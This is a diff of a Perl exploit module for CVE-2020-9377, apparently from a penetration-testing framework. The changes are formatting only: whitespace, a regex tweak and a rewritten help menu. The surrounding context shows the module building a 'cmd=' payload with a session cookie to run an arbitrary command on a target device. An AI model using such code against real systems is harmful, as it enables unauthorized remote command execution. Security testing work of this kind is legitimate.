@@ -2,7 +2,7 @@ package Spellbook::Advisory::CVE_2020_9377 {
     use strict;
     use warnings;
     use Spellbook::Core::UserAgent;
-
+    
     sub new {
         my ($self, $parameters) = @_;
         my ($help, $target, $cookie, $command, @results);
@@ -16,13 +16,13 @@ package Spellbook::Advisory::CVE_2020_9377 {
         );
 
         if ($target) {
-            if ($target !~ /^http(?:s)?:\/\//x) {
+            if ($target !~ /^http(s)?:\/\//x) {
                 $target = "http://$target";
             }
 
             my $userAgent = Spellbook::Core::UserAgent -> new();
             my $payload   = "cmd=$command";
-
+            
             my $headers   = HTTP::Headers -> new (
                 "Content-Type" => "application/x-www-form-urlencoded",
                 "Cookie" => "uid=$cookie"
@@ -39,16 +39,13 @@ package Spellbook::Advisory::CVE_2020_9377 {
         }
 
         if ($help) {
-            return<<"EOT";
-
-Advisory::CVE_2020_9377
-=======================
--h, --help     See this menu
--t, --target   Define a target
--c, --cookie    Define a session cookie
--p, --payload  Set the command to run on the target\n\n";
-
-EOT
+            return "
+                \rAdvisory::CVE_2020_9377
+                \r=======================
+                \r-h, --help     See this menu
+                \r-t, --target   Define a target
+                \r-c, --cookie    Define a session cookie
+                \r-p, --payload  Set the command to run on the target\n\n";
         }
 
         return 0;
